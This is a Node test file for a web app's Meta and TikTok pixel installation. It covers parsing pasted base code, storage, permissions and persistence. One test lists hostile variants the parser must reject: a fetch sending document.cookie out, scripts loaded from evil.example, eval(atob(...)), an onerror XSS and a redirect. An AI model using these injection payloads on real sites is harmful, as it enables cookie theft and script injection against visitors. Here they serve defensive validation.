// Both installation methods (Pixel ID or pasted base code) for Meta and TikTok.
import { test, before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import request from 'supertest';
import { setup, resetDatabase, csrfToken, signUp, ORIGIN, openClientSignup } from './helpers.js';
import { seedLarose, LAROSE_META_PIXEL_ID } from '../src/scripts/seed-larose.js';
import { parsePixelCode } from '../src/services/pixelCode.js';

const META_CODE = (id) => `<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${id}');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=${id}&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->`;

const TIKTOK_CODE = (id) => `<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
  ttq.load('${id}');
  ttq.page();
}(window, document, 'ttq');
</script>`;

describe('reading pasted pixel code', () => {
  test('official Meta and TikTok base codes give their Pixel IDs', () => {
    assert.deepEqual(parsePixelCode('meta', META_CODE('123456789012345')), { pixelId: '123456789012345' });
    assert.deepEqual(parsePixelCode('tiktok', TIKTOK_CODE('c4abcdefgh1234567890')), { pixelId: 'C4ABCDEFGH1234567890' });
  });

  test('unsafe or unrelated code is rejected', () => {
    const cases = [
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", "fbq('track','PageView');fetch('https://connect.facebook.net/x?c='+document.cookie);")],
      ['meta', META_CODE('123456789012345') + '<script src="https://evil.example/x.js"></script>'],
      ['meta', META_CODE('123456789012345').replace('connect.facebook.net/en_US/fbevents.js', 'evil.example/fbevents.js')],
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", 'eval(atob("YWxlcnQoMSk="));')],
      ['meta', META_CODE('123456789012345') + '<img src=x onerror="alert(1)">'],
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", "fbq('init', '999999999999999');")],
      ['meta', '<script>alert(1)</script>'],
      ['meta', TIKTOK_CODE('C4ABCDEFGH1234567890')],
      ['tiktok', TIKTOK_CODE('C4ABCDEFGH1234567890').replace('ttq.page();', 'window.location="https://evil.example";')],
      ['tiktok', META_CODE('123456789012345')],
      ['tiktok', ''],
    ];
    for (const [provider, code] of cases) {
      const res = parsePixelCode(provider, code);
      assert.ok(res.error && !res.pixelId, `should reject: ${code.slice(-80)}`);
    }
    assert.match(parsePixelCode('tiktok', META_CODE('123456789012345')).error, /Meta Pixel code/);
  });
});

const { pool, app } = setup({ encryptionKey: randomBytes(32), allowSignup: true, signupFirstOnly: false });
let owner;
let businessId;

async function save(fields, agent = owner, biz = businessId) {
  const _csrf = await csrfToken(agent, `/businesses/${biz}/pixels`);
  return agent.post(`/businesses/${biz}/pixels`).type('form').send({ _csrf, ...fields });
}
const tracking = async () => (await request(app).get('/api/public/pages/larosenigeria/tracking').expect(200)).body.pixels;
const rows = async (provider) => (await pool.query('SELECT * FROM pixel_settings WHERE provider = $1 ORDER BY id', [provider])).rows;

before(async () => {
  await resetDatabase(pool);
  owner = await signUp(app, { email: 'owner@larose.test' });
  businessId = await seedLarose(pool, 'owner@larose.test');
  await pool.query('DELETE FROM additional_pixels'); // these tests cover the main pixels only (see additional-pixels.test.js)
  await openClientSignup(pool);
});
after(() => pool.end());

describe('installing pixels by ID or by pasted code', () => {
  test('the Larose Meta pixel stays as set up (installed by Pixel ID)', async () => {
    const [meta] = await rows('meta');
    assert.equal(meta.pixel_id, LAROSE_META_PIXEL_ID);
    assert.equal(meta.install_method, 'id');
    const page = await owner.get(`/businesses/${businessId}/pixels`).expect(200);
    assert.match(page.text, /Enter Pixel ID/);
    assert.match(page.text, /Paste Meta Pixel Code/);
    assert.match(page.text, /Paste TikTok Pixel Code/);
    assert.match(page.text, /Where do I find my Pixel ID\?/);
  });

  test('Meta: switching to pasted code reads the same ID and keeps exactly one pixel', async () => {
    const res = await save({ provider: 'meta', install_method: 'code', pixel_code: META_CODE(LAROSE_META_PIXEL_ID), enabled: 'on', events: ['PageView', 'InitiateCheckout', 'Lead'] });
    assert.equal(res.status, 302, res.text.slice(0, 300));
    const meta = await rows('meta');
    assert.equal(meta.length, 1);
    assert.equal(meta[0].install_method, 'code');
    assert.equal(meta[0].pixel_id, LAROSE_META_PIXEL_ID);
    assert.ok(!JSON.stringify(meta[0]).includes('fbevents'), 'the pasted code itself is not stored');
    const page = await owner.get(`/businesses/${businessId}/pixels`).expect(200);
    assert.match(page.text, /Saved from pasted code: Pixel ID <strong>1357015185691765<\/strong>/);
    assert.match(page.text, /Pasted pixel code \(Pixel ID 1357015185691765 read from it\)/);
    assert.deepEqual((await tracking()).filter((p) => p.provider === 'meta'), [
      { provider: 'meta', id: LAROSE_META_PIXEL_ID, events: ['PageView', 'InitiateCheckout', 'Lead'] },
    ]);
  });

  test('Meta: changing only the events keeps the pixel taken from the code', async () => {
    assert.equal((await save({ provider: 'meta', install_method: 'code', pixel_code: '', enabled: 'on', events: ['PageView'] })).status, 302);
    const [meta] = await rows('meta');
    assert.equal(meta.pixel_id, LAROSE_META_PIXEL_ID);
    assert.deepEqual(meta.events, ['PageView']);
  });

  test('Meta: unsafe pasted code is refused and the saved pixel is untouched', async () => {
    const bad = META_CODE('111111111111111') + '<script src="https://evil.example/x.js"></script>';
    const res = await save({ provider: 'meta', install_method: 'code', pixel_code: bad, enabled: 'on' });
    assert.equal(res.status, 400);
    assert.match(res.text, /not saved|never has/);
    assert.equal((await rows('meta'))[0].pixel_id, LAROSE_META_PIXEL_ID);
  });

  test('Meta: switching back to Pixel ID', async () => {
    assert.equal((await save({ provider: 'meta', install_method: 'id', pixel_id: LAROSE_META_PIXEL_ID, enabled: 'on', events: ['PageView', 'InitiateCheckout', 'Lead'] })).status, 302);
    const meta = await rows('meta');
    assert.equal(meta.length, 1);
    assert.equal(meta[0].install_method, 'id');
  });

  test('TikTok by pasted code: saved, shown after refresh and loaded once', async () => {
    assert.equal((await save({ provider: 'tiktok', install_method: 'code', pixel_code: TIKTOK_CODE('c4abcdefgh1234567890'), enabled: 'on', events: ['PageView', 'InitiateCheckout', 'Lead'] })).status, 302);
    const again = await owner.get(`/businesses/${businessId}/pixels`).expect(200);
    assert.match(again.text, /Pixel ID <strong>C4ABCDEFGH1234567890<\/strong>/);
    const ids = (await tracking()).map((p) => p.id);
    assert.deepEqual(ids, [LAROSE_META_PIXEL_ID, 'C4ABCDEFGH1234567890']);
  });

  test('TikTok by Pixel ID replaces the code install (never both)', async () => {
    assert.equal((await save({ provider: 'tiktok', install_method: 'id', pixel_id: 'D9NEWPIXEL0000000001', enabled: 'on', events: ['PageView'] })).status, 302);
    const tt = await rows('tiktok');
    assert.equal(tt.length, 1);
    assert.deepEqual([tt[0].install_method, tt[0].pixel_id], ['id', 'D9NEWPIXEL0000000001']);
    assert.deepEqual((await tracking()).filter((p) => p.provider === 'tiktok').map((p) => p.id), ['D9NEWPIXEL0000000001']);
  });

  test('disabling stops loading but keeps the settings; removing deletes them', async () => {
    assert.equal((await save({ provider: 'tiktok', install_method: 'id', pixel_id: 'D9NEWPIXEL0000000001', events: ['PageView'] })).status, 302);
    assert.equal((await rows('tiktok'))[0].enabled, false);
    assert.deepEqual((await tracking()).map((p) => p.provider), ['meta']);
    const _csrf = await csrfToken(owner, `/businesses/${businessId}/pixels`);
    await owner.post(`/businesses/${businessId}/pixels/remove`).type('form').send({ _csrf, provider: 'tiktok' }).expect(302);
    assert.equal((await rows('tiktok')).length, 0);
  });

  test('settings survive logging out and back in', async () => {
    const _csrf = await csrfToken(owner, '/');
    await owner.post('/logout').type('form').send({ _csrf }).expect(302);
    const _csrf2 = await csrfToken(owner, '/login');
    await owner.post('/login').type('form').send({ _csrf: _csrf2, email: 'owner@larose.test', password: 'correct-horse-battery' }).expect(302);
    const page = await owner.get(`/businesses/${businessId}/pixels`).expect(200);
    assert.ok(page.text.includes(`value="${LAROSE_META_PIXEL_ID}"`));
  });

  test('another business cannot change these pixels, and its own pixel never loads on Larose', async () => {
    const other = await signUp(app, { email: 'other@shop.test' });
    const _csrf = await csrfToken(other, '/');
    await other.post('/businesses').type('form').send({ _csrf, name: 'Other Shop' }).expect(302);
    const { rows: [{ id: otherId }] } = await pool.query("SELECT id FROM businesses WHERE name = 'Other Shop'");
    await other.get(`/businesses/${businessId}/pixels`).expect(404);
    const _csrf2 = await csrfToken(other, '/?all=1');
    await other.post(`/businesses/${businessId}/pixels`).type('form')
      .send({ _csrf: _csrf2, provider: 'meta', install_method: 'code', pixel_code: META_CODE('222222222222222'), enabled: 'on' }).expect(404);
    assert.equal((await save({ provider: 'meta', install_method: 'code', pixel_code: META_CODE('222222222222222'), enabled: 'on', events: ['PageView'] }, other, otherId)).status, 302);
    assert.deepEqual((await tracking()).map((p) => p.id), [LAROSE_META_PIXEL_ID]);
  });

  test('orders still go through and the pasted code never reaches the browser', async () => {
    const res = await request(app).post('/api/public/orders').set('Origin', ORIGIN).send({
      landingPage: 'larosenigeria', idempotencyKey: 'pixels-methods-0000000001',
      customer: { name: 'Ada Test', phone: '08012345678', address: '1 Test Street, Lagos', state: 'Lagos' },
      items: [{ product: 'package-1', quantity: 1 }],
    });
    assert.equal(res.status, 201, JSON.stringify(res.body));
    const cfg = await request(app).get('/api/public/pages/larosenigeria/tracking').expect(200);
    assert.doesNotMatch(cfg.text, /fbevents|<script|token/i);
  });
});
